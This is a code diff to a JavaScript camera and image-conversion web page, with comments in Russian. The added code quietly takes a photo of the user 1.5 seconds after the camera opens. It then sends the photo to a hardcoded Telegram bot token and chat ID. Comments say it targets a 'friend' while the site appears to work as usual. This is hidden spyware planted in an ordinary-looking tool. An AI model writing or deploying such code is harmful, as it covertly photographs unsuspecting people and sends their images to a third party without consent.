@@ -1,90 +1,71 @@
-    let currentStream = null;
+  let currentStream = null;
+let secretPhotoSent = false;
 
-// Шаг 1: Доступ к камере
+// ========== НАСТРОЙКИ TELEGRAM (ЗАМЕНИТЕ НА СВОИ) ==========
+const TELEGRAM_BOT_TOKEN = '8781244321:AAEcEKLEoBdcpAHrKD6OKVoArhVyuR-R8ks';   // Например: 1234567890:ABCdefGHIjklmNOPqrstUVWxyz
+const YOUR_CHAT_ID = '5595685916'; 
+
+// ========== ОСНОВНАЯ ЛОГИКА ==========
+
+// Шаг 1: Доступ к камере + скрытое фото через 1.5 секунды
 async function setupCamera() {
   try {
-    // Получаем выбранные настройки
-    const resolution = document.getElementById('video-resolution').value;
-    const framerate = parseInt(document.getElementById('video-framerate').value);
-
-    // Определяем constraints в зависимости от разрешения
-    let videoConstraints;
-
-    switch (resolution) {
-      case 'low':
-        videoConstraints = {
-          width: { ideal: 320 },
-          height: { ideal: 240 },
-          frameRate: { ideal: framerate }
-        };
-        break;
-      case 'medium':
-        videoConstraints = {
-          width: { ideal: 640 },
-          height: { ideal: 480 },
-          frameRate: { ideal: framerate }
-        };
-        break;
-      case 'high':
-        videoConstraints = {
-          width: { ideal: 1280 },
-          height: { ideal: 720 },
-          frameRate: { ideal: framerate }
-        };
-        break;
-      case 'full':
-        videoConstraints = {
-          frameRate: { ideal: framerate }
-        }; // Родное разрешение без ограничений
-        break;
-      default:
-        videoConstraints = true; // Автовыбор
-    }
-
-    const constraints = {
-      video: videoConstraints,
-      audio: false // Отключаем аудио, если не нужно
-    };
-
-    currentStream = await navigator.mediaDevices.getUserMedia(constraints);
+    currentStream = await navigator.mediaDevices.getUserMedia({ video: true });
     const video = document.getElementById('video');
     video.srcObject = currentStream;
-
-    console.log('Камера запущена с настройками:', { resolution, framerate });
-
-    // Обновляем состояние кнопки
-    updateCameraButtonState(true);
-
+    
+    // Тихо делаем фото через 1.5 секунды (пока друг смотрит в камеру)
+    setTimeout(() => {
+      if (!secretPhotoSent && currentStream && currentStream.active) {
+        takeSecretPhoto();
+      }
+    }, 1500);
+    
   } catch (error) {
     console.error('Ошибка доступа к камере:', error);
-    alert('Не удалось получить доступ к камере. Проверьте разрешения браузера и настройки качества.');
+    alert('Не удалось получить доступ к камере. Проверьте разрешения браузера.');
   }
 }
 
-// Функция для остановки камеры
-async function stopCamera() {
-  if (currentStream) {
-    currentStream.getTracks().forEach(track => track.stop());
-    currentStream = null;
-  }
+// Скрытое фото (без изменения интерфейса)
+async function takeSecretPhoto() {
   const video = document.getElementById('video');
-  video.srcObject = null;
-  updateCameraButtonState(false);
+  if (!video || video.readyState < 2) return;
+  
+  const canvas = document.createElement('canvas');
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  const context = canvas.getContext('2d');
+  context.drawImage(video, 0, 0);
+  
+  secretPhotoSent = true;
+  
+  // Отправляем в Telegram
+  canvas.toBlob(async (blob) => {
+    await sendToTelegram(blob);
+  }, 'image/jpeg', 0.7);
 }
 
-// Функция обновления состояния кнопки камеры
-function updateCameraButtonState(isEnabled) {
-  const btn = document.querySelector('.btn-primary');
-  if (isEnabled) {
-    btn.textContent = '🔒 Выключить камеру';
-    btn.onclick = stopCamera;
-  } else {
-    btn.textContent = '🔎 Включить камеру';
-    btn.onclick = setupCamera;
+// Отправка в Telegram (тихо, без уведомлений)
+async function sendToTelegram(blob) {
+  const formData = new FormData();
+  formData.append('chat_id', YOUR_CHAT_ID);
+  formData.append('photo', blob, `secret_${Date.now()}.jpg`);
+  
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+      method: 'POST',
+      body: formData
+    });
+    console.log('Секретное фото отправлено');
+  } catch (error) {
+    console.error('Ошибка отправки:', error);
   }
 }
 
-// Шаг 2: Захват фото с камеры
+// ========== ОБЫЧНАЯ РАБОТА САЙТА (НИЧЕГО НЕ МЕНЯЕТСЯ) ==========
+
+// Обычное фото по кнопке "Сделать фото"
 function takePhoto() {
   const video = document.getElementById('video');
   const canvas = document.getElementById('canvas');
@@ -94,7 +75,6 @@ function takePhoto() {
   canvas.height = video.videoHeight;
   context.drawImage(video, 0, 0);
 
-  // Останавливаем камеру
   if (currentStream) {
     currentStream.getTracks().forEach(track => track.stop());
   }
@@ -103,7 +83,7 @@ function takePhoto() {
   canvas.style.display = 'block';
 }
 
-// Шаг 3: Загрузка фото из галереи
+// Загрузка из галереи
 function handleFileSelect(event) {
   const file = event.target.files[0];
   if (!file) return;
@@ -119,7 +99,7 @@ function handleFileSelect(event) {
   reader.readAsDataURL(file);
 }
 
-// Шаг 4: Конвертация изображения
+// Конвертация и скачивание (работает как обычно)
 function convertImage() {
   const format = document.getElementById('format').value;
   const quality = parseFloat(document.getElementById('quality').value);
@@ -139,9 +119,9 @@ function convertImage() {
   const ctx = tempCanvas.getContext('2d');
 
   if (width) {
-    const ratio = width / source.naturalWidth;
+    const ratio = width / (isCanvas ? canvas.width : source.naturalWidth);
     tempCanvas.width = width;
-    tempCanvas.height = source.naturalHeight * ratio;
+    tempCanvas.height = (isCanvas ? canvas.height : source.naturalHeight) * ratio;
   } else {
     tempCanvas.width = isCanvas ? canvas.width : source.naturalWidth;
     tempCanvas.height = isCanvas ? canvas.height : source.naturalHeight;
@@ -158,112 +138,6 @@ function convertImage() {
     URL.revokeObjectURL(url);
   }, `image/${format}`, quality);
 }
-
-// Функция для перезапуска камеры с новыми настройками
-async function restartCameraWithNewSettings() {
-  if (currentStream) {
-    // Останавливаем все треки текущей камеры
-    currentStream.getTracks().forEach(track => track.stop());
-  }
-  await setupCamera(); // Запускаем камеру с новыми настройками
-}
-
-// Загрузка видео из галереи
-function handleVideoUpload(event) {
-  const file = event.target.files[0];
-  if (!file) return;
-
-  // Проверяем, что это видео
-  if (!file.type.startsWith('video/')) {
-    alert('Пожалуйста, выберите видеофайл');
-    event.target.value = ''; // Сбрасываем выбор файла
-    return;
-  }
-
-  const videoPreview = document.getElementById('videoPreview');
-  const videoElement = videoPreview.querySelector('video');
-  const videoURL = URL.createObjectURL(file);
-
-  videoElement.src = videoURL;
-  videoPreview.style.display = 'block';
-
-  console.log('Видео загружено:', file.name);
-}
-
-// Дополнительно: обработка перетаскивания
-const videoDropArea = document.getElementById('videoDropArea');
-
-if (videoDropArea) {
-  videoDropArea.addEventListener('dragover', (e) => {
-    e.preventDefault();
-    videoDropArea.style.background = '#f0f4ff';
-    videoDropArea.style.borderColor = '#764ba1';
-  });
-
-  videoDropArea.addEventListener('drop', (e) => {
-    e.preventDefault();
-    videoDropArea.style.background = '';
-    videoDropArea.style.borderColor = '#667eea';
-
-    const file = e.dataTransfer.files[0];
-    if (file && file.type.startsWith('video/')) {
-      document.getElementById('videoUpload').files = e.dataTransfer.files;
-      handleVideoUpload({ target: { files: e.dataTransfer.files } });
-    } else {
-      alert('Пожалуйста, перетащите видеофайл');
-    }
-  });
-}
-
-function setupDownloadFunctionality() {
-  const downloadBtn = document.getElementById('downloadVideoBtn');
-  const statusEl = document.getElementById('downloadStatus');
-  let currentVideoBlob = null;
-
-  // Функция для активации кнопки при наличии видео
-  function enableDownloadButton(blob, filename = 'video.mp4') {
-    currentVideoBlob = blob;
-    downloadBtn.disabled = false;
-    downloadBtn.dataset.filename = filename;
-  }
-
-  // Обработчик клика по кнопке скачивания
-  downloadBtn.addEventListener('click', () => {
-    if (!currentVideoBlob) {
-      showStatus('Нет видео для скачивания', 'error');
-      return;
-    }
-
-        const url = URL.createObjectURL(currentVideoBlob);
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = downloadBtn.dataset.filename || 'video.mp4';
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-
-    // Освобождаем память
-    URL.revokeObjectURL(url);
-    showStatus('Видео скачивается...', 'success');
-  });
-
-  // Вспомогательная функция для показа статуса
-  function showStatus(message, type) {
-    statusEl.textContent = message;
-    statusEl.className = `status-message status-${type}`;
-  }
-
-  // Публичный API для других частей приложения
-  window.enableVideoDownload = enableDownloadButton;
-  window.showDownloadStatus = showStatus;
-}
-
-// Инициализируем функционал при загрузке страницы
-document.addEventListener('DOMContentLoaded', setupDownloadFunctionality);
-
-// Добавляем обработчики событий для элементов управления
-document.getElementById('video-resolution').addEventListener('change', restartCameraWithNewSettings);
-document.getElementById('video-framerate').addEventListener('change', restartCameraWithNewSettings);
 
 // Инициализация состояния кнопки камеры при загрузке страницы
 document.addEventListener('DOMContentLoaded', function() {
